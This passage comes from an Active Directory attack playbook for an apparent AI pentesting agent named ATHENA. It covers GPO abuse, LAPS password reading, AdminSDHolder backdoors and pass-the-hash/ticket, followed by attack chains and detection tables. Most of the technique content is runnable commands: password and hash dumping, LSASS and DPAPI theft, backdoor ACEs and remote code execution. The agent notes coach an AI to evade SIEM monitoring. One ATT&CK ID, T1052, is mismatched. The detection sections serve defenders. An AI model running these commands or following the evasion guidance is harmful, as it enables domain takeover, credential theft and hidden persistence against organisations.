- Event ID 5136: Directory service object modified — GPO changes
- Event ID 4719: System audit policy was changed
- SYSVOL changes: Monitor `\\domain.local\SYSVOL\domain.local\Policies\` for new scripts, tasks
- Event ID 4698: Scheduled task created on endpoint (when task executes)
- SIEM: GPO GPC/GPT version mismatch (version counter increment without change ticket)

### MITRE ATT&CK
- T1484.001 - Domain Policy Modification: Group Policy Modification
- T1053.005 - Scheduled Task/Job: Scheduled Task

---

## Technique 18: LAPS Enumeration

### Objective
Read the `ms-Mcs-AdmPwd` attribute from computer objects to obtain randomized local administrator passwords managed by Local Administrator Password Solution (LAPS), enabling local admin access to those machines.

### Prerequisites
- Valid domain credentials with read access to `ms-Mcs-AdmPwd` attribute
- LAPS deployed in the environment (check `ms-Mcs-AdmPwd` attribute exists)

### Tools
- `crackmapexec` with `--laps` module
- `ldapsearch` (direct LDAP query)
- `bloodyAD`
- `Get-LAPSPasswords.ps1` (PowerView-based)
- `LAPSDumper` (Python)

### Procedure

**Step 1: Detect LAPS deployment**
```bash
# Check if LAPS schema extension exists
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "CN=Schema,CN=Configuration,DC=${DOMAIN//./,DC=}" \
  "(cn=ms-Mcs-AdmPwd)" cn

# CrackMapExec LAPS detection
crackmapexec smb $TARGET_DC \
  -u $USERNAME -p "$PASSWORD" \
  -M laps
```

**Step 2: Read LAPS passwords for all computers**
```bash
# Direct LDAP query (reads all computers you have access to)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(ms-Mcs-AdmPwd=*)" \
  cn ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime \
  | tee $LOOT_DIR/laps_passwords.txt

# CrackMapExec against subnet
crackmapexec ldap $TARGET_DC \
  -u $USERNAME -p "$PASSWORD" \
  -M laps -o TARGET=10.0.0.0/24

# LAPSDumper Python tool
python3 LAPSDumper.py \
  -u $USERNAME -p "$PASSWORD" \
  -d $DOMAIN \
  -dc-ip $TARGET_DC \
  | tee $LOOT_DIR/laps_dump.txt
```

**Step 3: Read specific computer's LAPS password**
```bash
# Target specific machine
bloodyAD -u $USERNAME -p "$PASSWORD" -d $DOMAIN --host $TARGET_DC \
  get object "$TARGET_HOST\$" --attr ms-Mcs-AdmPwd

# PowerView (from Windows)
Get-DomainComputer -Identity $TARGET_HOST \
  -Properties Name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
```

**Step 4: Use LAPS password for local admin access**
```bash
# The LAPS password is for the local Administrator account
crackmapexec smb $TARGET_HOST \
  -u Administrator -p "$LAPS_PASSWORD" \
  --local-auth

# Remote code execution
psexec.py Administrator:"$LAPS_PASSWORD"@$TARGET_HOST -no-pass

# Dump credentials from target
crackmapexec smb $TARGET_HOST \
  -u Administrator -p "$LAPS_PASSWORD" \
  --local-auth --sam
```

**Step 5: LAPS v2 (Windows LAPS - newer schema)**
```bash
# Windows LAPS uses different attribute: msLAPS-Password (encrypted)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(msLAPS-Password=*)" \
  cn msLAPS-Password msLAPS-PasswordExpirationTime

# Note: msLAPS-Password in Windows LAPS may be encrypted
# Use crackmapexec with --laps module which handles decryption
```

### Detection
- Event ID 4662: Object operation — read of `ms-Mcs-AdmPwd` attribute from non-admin account
- LAPS audit: Enable attribute-level auditing on `ms-Mcs-AdmPwd`
- Alert: Bulk read of LAPS passwords across many computers in short window
- Privileged Access: LAPS read rights should be limited to specific admin groups

### MITRE ATT&CK
- T1552 - Unsecured Credentials
- T1087.002 - Account Discovery: Domain Account

---

## Technique 19: AdminSDHolder Persistence

### Objective
Abuse the SDProp mechanism to maintain persistence by modifying the AdminSDHolder container's ACL. Every 60 minutes, SDProp propagates the AdminSDHolder's DACL to all protected group members (Domain Admins, Enterprise Admins, etc.), making backdoor ACEs extremely persistent.

### Prerequisites
- Domain Admin or equivalent privileges (to write AdminSDHolder DACL)
- Understanding of protected groups and SDProp timing

### Tools
- `dacledit.py` (Impacket)
- `PowerView` / `Set-DomainObjectAcl`
- `bloodyAD`

### Procedure

**Step 1: Understand AdminSDHolder scope**
```bash
# List all protected accounts (sdPropDone = 1 on user, or adminCount = 1)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" \
  "(adminCount=1)" \
  cn distinguishedName adminCount
```

**Step 2: Add backdoor ACE to AdminSDHolder**
```bash
# Grant our backdoor account GenericAll on AdminSDHolder
# This will propagate to ALL protected accounts within 60 minutes

dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action write \
  -rights FullControl \
  -principal $BACKDOOR_ACCOUNT \
  -target-dn "CN=AdminSDHolder,CN=System,DC=${DOMAIN//./,DC=}"

# PowerView alternative
$ACE = New-ADObjectAccessControlEntry \
  -Principal $BACKDOOR_ACCOUNT \
  -AccessControlType Allow \
  -AccessMask 983551  # GenericAll

Set-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=${DOMAIN//./,DC=}" \
  -PrincipalIdentity $BACKDOOR_ACCOUNT \
  -Rights All
```

**Step 3: Force SDProp to run immediately (for testing)**
```powershell
# From DC (requires domain admin)
Invoke-SDPropagator -TaskName FixUpInheritance -timeoutMinutes 1 -showProgress

# Manual trigger via LDAP attribute
# Reboot or wait 60 minutes in production
```

**Step 4: Verify propagation**
```bash
# Check if backdoor ACE propagated to Domain Admins group
dacledit.py $DOMAIN/$USERNAME:"$PASSWORD" \
  -dc-ip $TARGET_DC \
  -action read \
  -target-dn "CN=Domain Admins,CN=Users,DC=${DOMAIN//./,DC=}"

# Look for $BACKDOOR_ACCOUNT with GenericAll rights
```

**Step 5: Use AdminSDHolder-propagated access**
```bash
# Now $BACKDOOR_ACCOUNT has GenericAll on all Domain Admins members
# Use ACL abuse chain to reach DA (ForceChangePassword, add to group, etc.)
bloodyAD -u $BACKDOOR_ACCOUNT -p "$BACKDOOR_PASSWORD" -d $DOMAIN --host $TARGET_DC \
  add groupMember "Domain Admins" $BACKDOOR_ACCOUNT
```

### Detection
- Event ID 5136: Modification to CN=AdminSDHolder object (should be extremely rare)
- SIEM alert: Any write operation to AdminSDHolder in non-change-window
- Event ID 4662: Handle operations on AdminSDHolder
- Periodic audit: Compare AdminSDHolder DACL to baseline in change management system
- Microsoft Defender for Identity: "Suspicious AdminSDHolder modification" alert

### MITRE ATT&CK
- T1484 - Domain Policy Modification
- T1098 - Account Manipulation

---

## Technique 20: Pass-the-Hash / Pass-the-Ticket

### Objective
Use captured NTLM hashes or Kerberos tickets directly for authentication without knowing the plaintext password, enabling lateral movement across the domain.

### Prerequisites
- NT hash (from secretsdump, SAM dump, LSASS dump) OR
- Kerberos TGT/TGS (.ccache file from previous techniques)
- Network access to target host (SMB 445, WinRM 5985, RPC 135, etc.)

### Tools
- `crackmapexec` (PTH lateral movement, validation)
- `psexec.py`, `wmiexec.py`, `smbexec.py` (Impacket - code execution)
- `evil-winrm` (WinRM with hash support)
- `mssqlclient.py` (SQL Server)

### Procedure

**Pass-the-Hash (PTH) - Authentication with NT Hash**

```bash
# Validate hash works across network targets
crackmapexec smb 10.0.0.0/24 \
  -u $USERNAME \
  -H $HASH \
  -d $DOMAIN \
  | grep "[+]" | tee $LOOT_DIR/pth_valid_hosts.txt

# PSExec equivalent (creates service, noisier)
psexec.py $DOMAIN/$USERNAME@$TARGET_HOST \
  -hashes :$HASH

# WMI exec (less noisy than psexec)
wmiexec.py $DOMAIN/$USERNAME@$TARGET_HOST \
  -hashes :$HASH

# SMB exec (creates service, different service name pattern)
smbexec.py $DOMAIN/$USERNAME@$TARGET_HOST \
  -hashes :$HASH

# WinRM (requires WinRM enabled + user in Remote Management Users group)
evil-winrm -i $TARGET_HOST -u $USERNAME -H $HASH

# MSSQL (if user has SQL access)
mssqlclient.py $DOMAIN/$USERNAME@$TARGET_HOST \
  -hashes :$HASH -windows-auth

# Check shares and list files
smbclient.py $DOMAIN/$USERNAME@$TARGET_HOST \
  -hashes :$HASH
```

**Pass-the-Ticket (PTT) - Authentication with Kerberos Ticket**
```bash
# Set environment variable to point to ticket
export KRB5CCNAME=$LOOT_DIR/ticket.ccache

# Verify ticket content
klist

# PSExec with Kerberos
psexec.py $DOMAIN/$USERNAME@$TARGET_HOST.$DOMAIN \
  -k -no-pass

# WMI exec with Kerberos
wmiexec.py $DOMAIN/$USERNAME@$TARGET_HOST.$DOMAIN \
  -k -no-pass

# Secretsdump with Kerberos
secretsdump.py $DOMAIN/$USERNAME@$TARGET_HOST.$DOMAIN \
  -k -no-pass

# CrackMapExec with Kerberos ticket
crackmapexec smb $TARGET_HOST \
  -u $USERNAME \
  -k \
  --use-kcache
```

**Overpass-the-Hash (Convert NTLM Hash to Kerberos TGT)**
```bash
# Using getTGT.py to get TGT from hash
getTGT.py $DOMAIN/$USERNAME \
  -hashes :$HASH \
  -dc-ip $TARGET_DC

export KRB5CCNAME=$LOOT_DIR/$USERNAME.ccache

# Now use PTT methods above with full Kerberos
psexec.py $DOMAIN/$USERNAME@$TARGET_HOST.$DOMAIN -k -no-pass
```

**Local PTH (using local SAM account hashes)**
```bash
# When machine account or local admin hash is obtained
# Use --local-auth flag for local account authentication
crackmapexec smb $TARGET_HOST \
  -u Administrator -H $LOCAL_ADMIN_HASH \
  --local-auth

psexec.py Administrator@$TARGET_HOST \
  -hashes :$LOCAL_ADMIN_HASH
```

**PTH for specific services**
```bash
# RDP (requires CredSSP disabled or RDP restricted admin mode)
xfreerdp /v:$TARGET_HOST /u:$USERNAME /pth:$HASH /d:$DOMAIN

# LDAP authentication (for AD operations)
ldapsearch -x -H ldap://$TARGET_DC \
  -D "$USERNAME@$DOMAIN" \
  # Note: Standard LDAP does not support direct PTH - use Kerberos

# For LDAP with hash, use getTGT then export ccache
```

**Credential Dump After Gaining Access**
```bash
# Dump SAM (local users + hashes)
crackmapexec smb $TARGET_HOST \
  -u $USERNAME -H $HASH -d $DOMAIN \
  --sam

# Dump LSASS (cached domain creds, in-memory)
crackmapexec smb $TARGET_HOST \
  -u $USERNAME -H $HASH -d $DOMAIN \
  -M lsassy   # Uses lsassy module for LSASS dump

# Dump DPAPI secrets (browser passwords, wifi keys)
crackmapexec smb $TARGET_HOST \
  -u $USERNAME -H $HASH -d $DOMAIN \
  -M dpapi
```

### Detection
- Event ID 4624 Logon Type 3: Network logon — baseline and alert on new source IPs
- Event ID 4624 Logon Type 3 with NtLmSsp authentication package (PTH indicator)
- Event ID 4776: Credential validation on DC (NTLM auth)
- PTH indicator: NTLM auth events where no corresponding logoff exists, or unusual auth times
- WMI: Event ID 4648 (explicit credential logon) + 4624 from wmiexec pattern
- PSExec: Event ID 7045 (service installed) + 4688 (PSEXESVC process) — highly detectable
- Microsoft Defender for Identity: "Pass-the-Hash attack" alert
- Recommendation: Use wmiexec/smbexec for lower noise; psexec is loudest

### MITRE ATT&CK
- T1550.002 - Use Alternate Authentication Material: Pass the Hash
- T1550.003 - Use Alternate Authentication Material: Pass the Ticket
- T1021.002 - Remote Services: SMB/Windows Admin Shares
- T1021.006 - Remote Services: Windows Remote Management

---

## Attack Chain Scenarios

### Scenario A: No Creds to Domain Admin (Internal Network)

```
1. Position on LAN segment with Windows hosts
2. LLMNR Poisoning [Technique 04] -> capture NTLMv2 hash
3. Crack hash [hashcat -m 5600] -> plaintext credentials
4. Domain Enumeration [Technique 01] -> BloodHound analysis
5. If Kerberoastable SPN exists:
   Kerberoasting [Technique 02] -> crack -> escalate
6. If ADCS deployed:
   certipy find --vulnerable [Technique 09] -> ESC1 -> DA cert -> DA hash
7. DCSync [Technique 11] -> dump KRBTGT
8. Golden Ticket [Technique 12] -> persistence
```

### Scenario B: User Creds to Domain Admin (ADCS Path)

```
1. Start: Valid low-priv domain user
2. certipy find --vulnerable -> identify ESC1 template
3. certipy req -upn administrator@domain -> get DA cert
4. certipy auth -> get DA NT hash + TGT
5. DCSync [Technique 11] -> full domain dump
6. AdminSDHolder [Technique 19] -> persistence
```

### Scenario C: Compromised Server to Domain Admin (Delegation)

```
1. Start: Code execution on server with unconstrained delegation
2. PetitPotam/DFSCoerce -> coerce DC auth to our server [Technique 14]
3. krbrelayx captures DC TGT [Technique 06]
4. DCSync with DC TGT [Technique 11]
5. Golden Ticket [Technique 12]
```

### Scenario D: ACL Abuse Chain (BloodHound Path)

```
1. BloodHound: jsmith -[GenericWrite]-> svc_app
2. Shadow Credentials on svc_app [Technique 15] -> get svc_app hash
3. svc_app -[WriteDACL]-> Domain Admins group
4. Grant jsmith GenericAll on Domain Admins [Technique 10]
5. Add jsmith to Domain Admins
6. DCSync -> KRBTGT -> Golden Ticket
```

---

## Detection Summary Table

| Technique | Primary Event IDs | MDI Alert | Noise Level |
|---|---|---|---|
| Domain Enumeration | 4661, 4688 | LDAP Recon | Medium |
| Kerberoasting | 4769 (RC4 TGS) | Kerberoasting | Low |
| AS-REP Roasting | 4768 (no preauth) | AS-REP Roasting | Low |
| LLMNR Poisoning | 4625 | SMB Relay | Medium |
| NTLM Relay LDAP | 4624, 4662 | NTLM Relay | Low-Medium |
| Unconstrained Delegation | 4769 (machine TGT) | Pass-the-Ticket | Low |
| Constrained Delegation | 4769 (S4U) | - | Low |
| RBCD | 4742 (computer attr) | - | Low |
| ADCS ESC1 | 4886, 4887 | - | Low |
| ADCS ESC8 | 4624, 4887 | - | Low |
| ACL Abuse | 5136, 4728 | DCSync | Low-Medium |
| DCSync | 4662 (replication) | DCSync | Low |
| Golden Ticket | 4769 (long TTL) | Golden Ticket | Low |
| Silver Ticket | 4624 on target | Silver Ticket | Very Low |
| Auth Coercion | machine auth | PetitPotam | Low |
| Shadow Credentials | 5136 (KeyCred) | - | Very Low |
| SID History | 4765 | - | Very Low |
| GPO Abuse | 5136, 4698 | GPO Modification | Low |
| LAPS | 4662 (read) | - | Low |
| AdminSDHolder | 5136 (SDH write) | AdminSDHolder | Very Low |
| PTH | 4624 (NtLmSsp) | Pass-the-Hash | Medium |

---

## MITRE ATT&CK Coverage Matrix

| ATT&CK ID | Technique Name | Covered By |
|---|---|---|
| T1087.002 | Account Discovery: Domain Account | Technique 01 |
| T1069.002 | Domain Groups Discovery | Technique 01 |
| T1018 | Remote System Discovery | Technique 01 |
| T1482 | Domain Trust Discovery | Technique 01 |
| T1201 | Password Policy Discovery | Technique 01 |
| T1558.003 | Kerberoasting | Technique 02 |
| T1558.004 | AS-REP Roasting | Technique 03 |
| T1557.001 | LLMNR/NBT-NS Poisoning | Techniques 04, 05 |
| T1098 | Account Manipulation | Techniques 05, 10, 16 |
| T1134.001 | Token Impersonation | Technique 06 |
| T1558 | Kerberos Ticket Abuse | Techniques 06, 07, 08 |
| T1649 | Forge Auth Certificates | Techniques 09, 15 |
| T1222 | File/Dir Permissions Modification | Technique 10 |
| T1003.006 | DCSync | Technique 11 |
| T1558.001 | Golden Ticket | Technique 12 |
| T1558.002 | Silver Ticket | Technique 13 |
| T1187 | Forced Authentication | Technique 14 |
| T1556 | Modify Authentication Process | Technique 15 |
| T1134.005 | SID-History Injection | Technique 16 |
| T1484.001 | GPO Modification | Technique 17 |
| T1052 | LAPS Credential Access | Technique 18 |
| T1484 | Domain Policy Modification | Technique 19 |
| T1550.002 | Pass the Hash | Technique 20 |
| T1550.003 | Pass the Ticket | Technique 20 |
| T1021.002 | SMB/Windows Admin Shares | Technique 20 |

---

## ATHENA Agent Notes

### Tool Execution Priority
1. Python/Impacket tools (run from Linux attacker box — no AV exposure)
2. CrackMapExec (modular, agentless, runs externally)
3. Certipy (ADCS attacks)
4. bloodyAD (ACL operations from Linux)
5. Rubeus/SharpHound/PowerView (Windows-only, requires code execution)

### Opsec Guidance
- Prefer AES over RC4 wherever possible (avoid RC4 downgrade detection)
- DCSync individual accounts rather than full dump where possible
- Use wmiexec over psexec (less detectable, no service installation)
- Clean up: Remove added computer accounts, restore modified GPOs, remove shadow credentials
- Timing: Avoid 2-4 AM (peak SIEM analyst coverage in SOC environments)
- Kerberoasting: Request TGS one at a time with delay, not bulk

### Variable Substitution Reminder
Before executing any command, ATHENA must substitute all `$PLACEHOLDER` variables:
- Query BloodHound/ldapdomaindump output for domain info
- Use loot directory from previous enumeration phase
- Validate tools are present before executing

---

*Playbook Version: 1.0.0 | ATHENA AI Pentesting Platform | ZeroK Labs*
*Sources: Impacket, BloodHound, Certipy, LOLADs, Praetorian Research, HackTricks AD*
